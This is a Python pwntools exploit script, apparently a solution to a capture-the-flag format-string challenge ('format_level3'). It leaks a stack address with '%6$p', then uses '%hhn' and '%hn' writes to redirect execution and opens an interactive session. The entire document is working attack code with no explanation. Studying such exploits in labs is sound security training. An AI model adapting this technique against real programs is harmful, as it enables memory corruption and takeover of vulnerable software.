#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

#context.log_level = 'debug'
debug = 1

if debug:
    io = process('./format_level3')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])



fmt = b"%6$p"
io.sendlineafter(b"Your choice: \n", str(3).encode())
#p()
io.sendafter(b"Input what you want to talk: \n", fmt)
io.recvuntil(b"You said: \n")
stack_addr = int((io.recv(10)),16)
success("stack_addr --> " + hex(stack_addr))


offset = (stack_addr + 4) &0xff

fmt2 = "%{}c%6$hhn".format(offset)
io.sendlineafter(b"Your choice: \n", str(3).encode())
#p()
io.sendafter(b"Input what you want to talk: \n", fmt2.encode())

fmt3 = flat(
    b"%37655c%14$hn"
)
io.sendlineafter(b"Your choice: \n", str(3).encode())
#p()
io.sendafter(b"Input what you want to talk: \n", fmt3)

#p()
io.sendlineafter(b"Your choice: \n", str(4).encode())

io.interactive()

